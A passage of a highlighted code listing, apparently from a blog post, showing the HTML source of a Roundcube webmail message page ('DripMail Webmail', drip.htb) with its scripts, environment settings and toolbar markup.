class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;&lt;title&gt;DripMail Webmail :: Analytics Dashboard&lt;/title&gt;</span><br><span class="line">	&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0&quot;</span>&gt;&lt;meta name=<span class="string">&quot;theme-color&quot;</span> content=<span class="string">&quot;#f4f4f4&quot;</span>&gt;&lt;meta name=<span class="string">&quot;msapplication-navbutton-color&quot;</span> content=<span class="string">&quot;#f4f4f4&quot;</span>&gt;</span><br><span class="line">	&lt;<span class="built_in">link</span> rel=<span class="string">&quot;shortcut icon&quot;</span> href=<span class="string">&quot;skins/elastic/images/favicon.ico?s=1716107237&quot;</span>&gt;</span><br><span class="line">	&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;skins/elastic/deps/bootstrap.min.css?s=1716107245&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;skins/elastic/styles/styles.min.css?s=1716107237&quot;</span>&gt;</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		&lt;script&gt;</span><br><span class="line">		try &#123;</span><br><span class="line">			<span class="keyword">if</span> (document.cookie.indexOf(<span class="string">&#x27;colorMode=dark&#x27;</span>) &gt; -1</span><br><span class="line">				|| (document.cookie.indexOf(<span class="string">&#x27;colorMode=light&#x27;</span>) === -1 &amp;&amp; window.matchMedia(<span class="string">&#x27;(prefers-color-scheme: dark)&#x27;</span>).matches)</span><br><span class="line">			) &#123;</span><br><span class="line">				document.documentElement.className += <span class="string">&#x27; dark-mode&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; catch (e) &#123; &#125;</span><br><span class="line">		&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;plugins/jqueryui/themes/elastic/jquery-ui.min.css?s=1716107237&quot;</span>&gt;&lt;script src=<span class="string">&quot;program/js/jquery.min.js?s=1716107242&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;program/js/common.min.js?s=1716107237&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;program/js/app.min.js?s=1716107237&quot;</span>&gt;&lt;/script&gt;&lt;script&gt;</span><br><span class="line">/*</span><br><span class="line">        @licstart  The following is the entire license notice <span class="keyword">for</span> the </span><br><span class="line">        JavaScript code <span class="keyword">in</span> this page.</span><br><span class="line"></span><br><span class="line">        Copyright (C) The Roundcube Dev Team</span><br><span class="line"></span><br><span class="line">        The JavaScript code <span class="keyword">in</span> this page is free software: you can redistribute</span><br><span class="line">        it and/or modify it under the terms of the GNU General Public License</span><br><span class="line">        as published by the Free Software Foundation, either version 3 of</span><br><span class="line">        the License, or (at your option) any later version.</span><br><span class="line"></span><br><span class="line">        The code is distributed WITHOUT ANY WARRANTY; without even the implied</span><br><span class="line">        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">        See the GNU GPL <span class="keyword">for</span> more details.</span><br><span class="line"></span><br><span class="line">        @licend  The above is the entire license notice</span><br><span class="line">        <span class="keyword">for</span> the JavaScript code <span class="keyword">in</span> this page.</span><br><span class="line">*/</span><br><span class="line">var rcmail = new rcube_webmail();</span><br><span class="line">rcmail.set_env(&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;standard_windows&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;locale&quot;</span>:<span class="string">&quot;en_US&quot;</span>,<span class="string">&quot;devel_mode&quot;</span>:null,<span class="string">&quot;rcversion&quot;</span>:10607,<span class="string">&quot;cookie_domain&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;cookie_path&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;cookie_secure&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;dark_mode_support&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;skin&quot;</span>:<span class="string">&quot;elastic&quot;</span>,<span class="string">&quot;extwin&quot;</span>:1,<span class="string">&quot;blankpage&quot;</span>:<span class="string">&quot;skins/elastic/watermark.html&quot;</span>,<span class="string">&quot;refresh_interval&quot;</span>:10,<span class="string">&quot;session_lifetime&quot;</span>:600,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;show&quot;</span>,<span class="string">&quot;comm_path&quot;</span>:<span class="string">&quot;/?_task=mail&quot;</span>,<span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;twZLggeBqoXLUfNK&quot;</span>,<span class="string">&quot;compose_extwin&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;date_format&quot;</span>:<span class="string">&quot;yy-mm-dd&quot;</span>,<span class="string">&quot;date_format_localized&quot;</span>:<span class="string">&quot;YYYY-MM-DD&quot;</span>,<span class="string">&quot;browser_capabilities&quot;</span>:&#123;<span class="string">&quot;pdf&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;flash&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;tiff&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;webp&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;pgpmime&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;,<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;2&quot;</span>,<span class="string">&quot;safemode&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;message_context&quot;</span>:null,<span class="string">&quot;message_flags&quot;</span>:[<span class="string">&quot;seen&quot;</span>],<span class="string">&quot;sender&quot;</span>:<span class="string">&quot;ebelford \u003Cebelford@drip.htb\u003E&quot;</span>,<span class="string">&quot;mailbox&quot;</span>:<span class="string">&quot;INBOX&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;bcase&quot;</span>,<span class="string">&quot;permaurl&quot;</span>:<span class="string">&quot;/?_task=mail&amp;_action=show&amp;_uid=2&amp;_mbox=INBOX&quot;</span>,<span class="string">&quot;has_writeable_addressbook&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;delimiter&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;mimetypes&quot;</span>:[<span class="string">&quot;text/plain&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="string">&quot;image/jpeg&quot;</span>,<span class="string">&quot;image/gif&quot;</span>,<span class="string">&quot;image/png&quot;</span>,<span class="string">&quot;image/bmp&quot;</span>,<span class="string">&quot;image/tiff&quot;</span>,<span class="string">&quot;image/webp&quot;</span>,<span class="string">&quot;application/x-javascript&quot;</span>,<span class="string">&quot;application/pdf&quot;</span>,<span class="string">&quot;message/rfc822&quot;</span>],<span class="string">&quot;read_when_deleted&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;display_next&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;mailboxes&quot;</span>:&#123;<span class="string">&quot;INBOX&quot;</span>:&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;INBOX&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Inbox&quot;</span>,<span class="string">&quot;virtual&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;inbox&quot;</span>&#125;&#125;,<span class="string">&quot;mailboxes_list&quot;</span>:[<span class="string">&quot;INBOX&quot;</span>],<span class="string">&quot;request_token&quot;</span>:<span class="string">&quot;QpdT8JMZkK0l5s23G8KkDNgOQl7p9Cca&quot;</span>&#125;);</span><br><span class="line">rcmail.add_label(&#123;<span class="string">&quot;loading&quot;</span>:<span class="string">&quot;Loading...&quot;</span>,<span class="string">&quot;servererror&quot;</span>:<span class="string">&quot;Server Error!&quot;</span>,<span class="string">&quot;connerror&quot;</span>:<span class="string">&quot;Connection Error (Failed to reach the server)!&quot;</span>,<span class="string">&quot;requesttimedout&quot;</span>:<span class="string">&quot;Request timed out&quot;</span>,<span class="string">&quot;refreshing&quot;</span>:<span class="string">&quot;Refreshing...&quot;</span>,<span class="string">&quot;windowopenerror&quot;</span>:<span class="string">&quot;The popup window was blocked!&quot;</span>,<span class="string">&quot;uploadingmany&quot;</span>:<span class="string">&quot;Uploading files...&quot;</span>,<span class="string">&quot;uploading&quot;</span>:<span class="string">&quot;Uploading file...&quot;</span>,<span class="string">&quot;close&quot;</span>:<span class="string">&quot;Close&quot;</span>,<span class="string">&quot;save&quot;</span>:<span class="string">&quot;Save&quot;</span>,<span class="string">&quot;cancel&quot;</span>:<span class="string">&quot;Cancel&quot;</span>,<span class="string">&quot;alerttitle&quot;</span>:<span class="string">&quot;Attention&quot;</span>,<span class="string">&quot;confirmationtitle&quot;</span>:<span class="string">&quot;Are you sure...&quot;</span>,<span class="string">&quot;delete&quot;</span>:<span class="string">&quot;Delete&quot;</span>,<span class="string">&quot;continue&quot;</span>:<span class="string">&quot;Continue&quot;</span>,<span class="string">&quot;ok&quot;</span>:<span class="string">&quot;OK&quot;</span>,<span class="string">&quot;checkingmail&quot;</span>:<span class="string">&quot;Checking for new messages...&quot;</span>,<span class="string">&quot;deletemessage&quot;</span>:<span class="string">&quot;Delete message&quot;</span>,<span class="string">&quot;movemessagetotrash&quot;</span>:<span class="string">&quot;Move message to trash&quot;</span>,<span class="string">&quot;movingmessage&quot;</span>:<span class="string">&quot;Moving message(s)...&quot;</span>,<span class="string">&quot;deletingmessage&quot;</span>:<span class="string">&quot;Deleting message(s)...&quot;</span>,<span class="string">&quot;markingmessage&quot;</span>:<span class="string">&quot;Marking message(s)...&quot;</span>,<span class="string">&quot;replyall&quot;</span>:<span class="string">&quot;Reply all&quot;</span>,<span class="string">&quot;replylist&quot;</span>:<span class="string">&quot;Reply list&quot;</span>,<span class="string">&quot;bounce&quot;</span>:<span class="string">&quot;Resend&quot;</span>,<span class="string">&quot;bouncemsg&quot;</span>:<span class="string">&quot;Resend (bounce)&quot;</span>,<span class="string">&quot;sendingmessage&quot;</span>:<span class="string">&quot;Sending message...&quot;</span>,<span class="string">&quot;back&quot;</span>:<span class="string">&quot;Back&quot;</span>,<span class="string">&quot;errortitle&quot;</span>:<span class="string">&quot;An error occurred!&quot;</span>,<span class="string">&quot;options&quot;</span>:<span class="string">&quot;Options&quot;</span>,<span class="string">&quot;plaintoggle&quot;</span>:<span class="string">&quot;Plain text&quot;</span>,<span class="string">&quot;htmltoggle&quot;</span>:<span class="string">&quot;HTML&quot;</span>,<span class="string">&quot;previous&quot;</span>:<span class="string">&quot;Previous&quot;</span>,<span class="string">&quot;next&quot;</span>:<span class="string">&quot;Next&quot;</span>,<span class="string">&quot;select&quot;</span>:<span class="string">&quot;Select&quot;</span>,<span class="string">&quot;browse&quot;</span>:<span class="string">&quot;Browse&quot;</span>,<span class="string">&quot;choosefile&quot;</span>:<span class="string">&quot;Choose file...&quot;</span>,<span class="string">&quot;choosefiles&quot;</span>:<span class="string">&quot;Choose files...&quot;</span>,<span class="string">&quot;purgefolderconfirm&quot;</span>:<span class="string">&quot;Do you really want to delete all messages in this folder?&quot;</span>,<span class="string">&quot;deletemessagesconfirm&quot;</span>:<span class="string">&quot;Do you really want to delete selected message(s)?&quot;</span>,<span class="string">&quot;viewsource&quot;</span>:<span class="string">&quot;Show source&quot;</span>,<span class="string">&quot;details&quot;</span>:<span class="string">&quot;Details&quot;</span>,<span class="string">&quot;summary&quot;</span>:<span class="string">&quot;Summary&quot;</span>,<span class="string">&quot;arialabelmessageheaders&quot;</span>:<span class="string">&quot;Message headers&quot;</span>&#125;);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;toolbar&quot;</span>,<span class="string">&quot;mailtoolbar&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;forwardmenu&quot;</span>,<span class="string">&quot;forward-menu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;replyallmenu&quot;</span>,<span class="string">&quot;replyall-menu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;messagemenu&quot;</span>,<span class="string">&quot;message-menu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;markmenu&quot;</span>,<span class="string">&quot;markmessage-menu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;headerlinks&quot;</span>,<span class="string">&quot;header-links&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;attachmentmenu&quot;</span>,<span class="string">&quot;attachmentmenu&quot;</span>);</span><br><span class="line">rcmail.gui_container(<span class="string">&quot;mailtomenu&quot;</span>,<span class="string">&quot;mailto-menu&quot;</span>);rcmail.register_button(<span class="string">&#x27;compose&#x27;</span>, <span class="string">&#x27;rcmbtn100&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;reply&#x27;</span>, <span class="string">&#x27;rcmbtn101&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;reply&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;reply-all&#x27;</span>, <span class="string">&#x27;rcmbtn102&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;reply-all&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;forward&#x27;</span>, <span class="string">&#x27;rcmbtn103&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;forward&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;rcmbtn104&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;rcmbtn105&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;previousmessage&#x27;</span>, <span class="string">&#x27;rcmbtn106&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;prev&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;nextmessage&#x27;</span>, <span class="string">&#x27;rcmbtn107&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;forward-inline&#x27;</span>, <span class="string">&#x27;rcmbtn108&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;forward inline active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;forward-attachment&#x27;</span>, <span class="string">&#x27;rcmbtn109&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;forward attachment active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;bounce&#x27;</span>, <span class="string">&#x27;rcmbtn110&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;forward bounce active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;reply-all&#x27;</span>, <span class="string">&#x27;rcmbtn111&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;reply all active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;reply-list&#x27;</span>, <span class="string">&#x27;rcmbtn112&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;reply list active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;rcmbtn113&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;print active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;rcmbtn114&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;download active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;edit&#x27;</span>, <span class="string">&#x27;rcmbtn115&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;edit asnew active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;viewsource&#x27;</span>, <span class="string">&#x27;rcmbtn116&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;source active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;move&#x27;</span>, <span class="string">&#x27;rcmbtn117&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;move active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;rcmbtn118&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;copy active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;rcmbtn119&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;extwin active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;mark&#x27;</span>, <span class="string">&#x27;rcmbtn120&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;read active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;mark&#x27;</span>, <span class="string">&#x27;rcmbtn121&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;unread active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;mark&#x27;</span>, <span class="string">&#x27;rcmbtn122&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;flag active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;mark&#x27;</span>, <span class="string">&#x27;rcmbtn123&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;unflag active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.gui_object(<span class="string">&#x27;remoteobjectsmsg&#x27;</span>, <span class="string">&#x27;remote-objects-message&#x27;</span>);</span><br><span class="line">rcmail.gui_object(<span class="string">&#x27;messagebody&#x27;</span>, <span class="string">&#x27;messagebody&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;open-attachment&#x27;</span>, <span class="string">&#x27;attachmenuopen&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;extwin active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.register_button(<span class="string">&#x27;download-attachment&#x27;</span>, <span class="string">&#x27;attachmenudownload&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;download active&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">rcmail.gui_object(<span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;messagestack&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=<span class="string">&quot;plugins/jqueryui/js/jquery-ui.min.js?s=1716107237&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=<span class="string">&quot;task-mail action-show&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;div <span class="built_in">id</span>=<span class="string">&quot;layout&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1 class=<span class="string">&quot;voice&quot;</span>&gt;Message preview&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;layout-content&quot;</span> class=<span class="string">&quot;selected&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;h2 <span class="built_in">id</span>=<span class="string">&quot;aria-label-toolbar&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Application toolbar&lt;/h2&gt;</span><br><span class="line">		&lt;div class=<span class="string">&quot;header&quot;</span> role=<span class="string">&quot;toolbar&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-toolbar&quot;</span>&gt;</span><br><span class="line">			&lt;a class=<span class="string">&quot;button icon back-list-button&quot;</span> href=<span class="string">&quot;#back&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Back&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">			&lt;span class=<span class="string">&quot;header-title&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">			</span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;mailtoolbar&quot;</span> class=<span class="string">&quot;toolbar menu&quot;</span> role=<span class="string">&quot;toolbar&quot;</span>&gt;</span><br><span class="line">	&lt;a class=<span class="string">&quot;compose hidden&quot;</span> title=<span class="string">&quot;Create a new message&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn100&quot;</span> role=<span class="string">&quot;button&quot;</span> href=<span class="string">&quot;/?_task=mail&amp;amp;_action=compose&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Compose&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	&lt;a class=<span class="string">&quot;reply disabled&quot;</span> title=<span class="string">&quot;Reply to sender&quot;</span> data-content-button=<span class="string">&quot;true&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn101&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;reply&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Reply&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	&lt;span class=<span class="string">&quot;dropbutton&quot;</span>&gt;</span><br><span class="line">		&lt;a class=<span class="string">&quot;reply-all disabled&quot;</span> title=<span class="string">&quot;Reply to list or to sender and all recipients&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn102&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;reply-all&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Reply all&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">		&lt;a href=<span class="string">&quot;#reply-all&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;replyallmenulink&quot;</span> class=<span class="string">&quot;dropdown&quot;</span> data-popup=<span class="string">&quot;replyall-menu&quot;</span> tabindex=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">			&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Reply-all options&lt;/span&gt;</span><br><span class="line">		&lt;/a&gt;</span><br><span class="line">	&lt;/span&gt;</span><br><span class="line">	&lt;span class=<span class="string">&quot;dropbutton&quot;</span>&gt;</span><br><span class="line">		&lt;a class=<span class="string">&quot;forward disabled&quot;</span> title=<span class="string">&quot;Forward the message&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn103&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;forward&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Forward&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">		&lt;a href=<span class="string">&quot;#forward&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;forwardmenulink&quot;</span> class=<span class="string">&quot;dropdown&quot;</span> data-popup=<span class="string">&quot;forward-menu&quot;</span> tabindex=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">			&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Forwarding options&lt;/span&gt;</span><br><span class="line">		&lt;/a&gt;</span><br><span class="line">	&lt;/span&gt;</span><br><span class="line">	&lt;span class=<span class="string">&quot;spacer&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">	&lt;a class=<span class="string">&quot;delete disabled&quot;</span> title=<span class="string">&quot;Delete message&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn104&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;delete&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Delete&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;a class=<span class="string">&quot;print disabled&quot;</span> title=<span class="string">&quot;Print this message&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn105&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> 